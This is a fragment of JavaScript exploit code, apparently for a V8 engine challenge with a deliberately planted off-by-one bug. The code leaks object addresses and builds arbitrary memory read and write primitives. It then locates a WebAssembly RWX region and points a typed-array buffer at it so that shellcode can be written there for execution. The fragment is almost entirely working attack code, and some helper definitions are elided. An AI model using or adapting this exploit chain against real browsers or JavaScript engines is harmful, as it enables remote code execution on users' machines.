...
var writer_arr = [c2f(0xdead, 0xbeef)];
let arr = [1.1];
for(let i = 0; i < 18; i++){
    arr.push(2.2);
}
...
let obj_prop = f2b(arr.offByOne()) >> 32n;
let obj_map_addr = f2b(arr.offByOne()) & (0xffffffffn)

let arr_addr = obj_prop - 244n - 16n - 60n;

arr.offByOne(c2f(Number(obj_map_addr), Number(arr_addr)));
obj.outline2 = 0x1000;

arr[0] = instance;
const instance_addr = BigInt(f2b(writer_arr[64])) & 0xffffffffn;

var temp_buf = new ArrayBuffer(shellcode.length)
var shellcode_writer = new Uint8Array(temp_buf);
arr[0] = shellcode_writer;

const shellcode_addr = BigInt(f2b(writer_arr[64])) & 0xffffffffn;

console.log(instance_addr.toString(16));
console.log(shellcode_addr.toString(16));

writer_arr[3] = b2f(0x725001cb821n);

function ArbRead(addr){
    writer_arr[4] = c2f((addr|1) - 8, 0x8000);
    return f2b(arr[0]);
}

function ArbWrite(addr, datalo, datahi){
    writer_arr[4] = c2f((addr|1) - 8, 0x8000);
    arr[0] = c2f(datalo, datahi);
}

const trusted_data = Number(ArbRead(Number(instance_addr + 8n)) >> 32n);
const rwx_region = ArbRead(Number(trusted_data) + 48);

console.log(rwx_region.toString(16));

ArbWrite(Number(shellcode_addr) + 0x30, Number(BigInt(rwx_region) & BigInt(0xffffffff)), Number(BigInt(rwx_region) >> BigInt(32)));
